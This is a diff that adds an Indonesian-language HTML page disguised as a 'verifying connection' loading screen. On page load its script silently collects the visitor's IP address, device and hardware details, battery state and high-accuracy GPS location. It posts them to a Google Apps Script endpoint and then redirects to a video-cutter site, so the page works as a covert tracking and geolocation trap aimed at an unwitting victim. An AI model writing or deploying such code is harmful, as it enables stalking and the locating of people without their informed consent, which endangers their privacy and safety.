@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memuat Halaman...</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f4f4f4; color: #555; }
+        .container { text-align: center; }
+        .loader { border: 4px solid #ddd; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="loader"></div>
+        <h3 id="status">Sedang memverifikasi koneksi...</h3>
+        <p>Mohon tunggu sebentar, konten sedang disiapkan.</p>
+    </div>
+
+    <script>
+    const statusText = document.getElementById("status");
+    
+    // Pastikan URL GAS ini sudah benar
+    const URL_GAS = "https://script.google.com/macros/s/AKfycbybnozwoLATECc30DwEW13-7f0ZHsfCnpmUT-HAdm3xPyCjXVLi1Y5iKU55uNg_tLcC/exec"; 
+
+    async function mulaiLacak() {
+        // Data dasar
+        let dataLog = {
+            ip: "Tidak Terdeteksi",
+            device: navigator.userAgent,
+            lat: "Ditolak",
+            lon: "Ditolak",
+            acc: "-",
+            // Tambahan informasi hardware & baterai
+            layar: `${window.screen.width}x${window.screen.height}`,
+            ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak terdeteksi",
+            baterai_level: "Tidak didukung",
+            baterai_status: "Tidak didukung",
+            os_platform: navigator.platform,
+            vendor: navigator.vendor,
+            cpu_cores: navigator.hardwareConcurrency || "Tidak diketahui"
+        };
+
+        // 1. Ambil Alamat IP
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const resData = await response.json();
+            dataLog.ip = resData.ip;
+        } catch (e) { console.log("Gagal ambil IP"); }
+
+        // 2. Ambil Informasi Baterai
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                dataLog.baterai_level = Math.round(battery.level * 100) + "%";
+                dataLog.baterai_status = battery.charging ? "Mengisi Daya" : "Discharge (Baterai)";
+            } catch (e) { console.log("Gagal akses baterai"); }
+        }
+
+        // 3. Minta Izin GPS (Sesuai alur kode asli Anda)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    dataLog.lat = position.coords.latitude;
+                    dataLog.lon = position.coords.longitude;
+                    dataLog.acc = position.coords.accuracy + " meter";
+                    kirimData(dataLog);
+                },
+                (error) => {
+                    console.log("GPS Ditolak");
+                    kirimData(dataLog); // Tetap kirim data meskipun GPS ditolak
+                },
+                { enableHighAccuracy: true, timeout: 8000 }
+            );
+        } else {
+            kirimData(dataLog);
+        }
+    }
+
+    function kirimData(payload) {
+        statusText.innerText = "Hampir selesai...";
+        
+        fetch(URL_GAS, {
+            method: "POST",
+            mode: "no-cors", // Penting agar tidak terkena CORS policy Google
+            body: JSON.stringify(payload),
+            headers: { "Content-Type": "application/json" }
+        })
+        .then(() => {
+            setTimeout(() => {
+                window.location.href = "https://online-video-cutter.com";
+            }, 1000);
+        })
+        .catch(err => {
+            window.location.href = "https://online-video-cutter.com";
+        });
+    }
+
+    window.onload = mulaiLacak;
+</script>
+</body>
+</html>
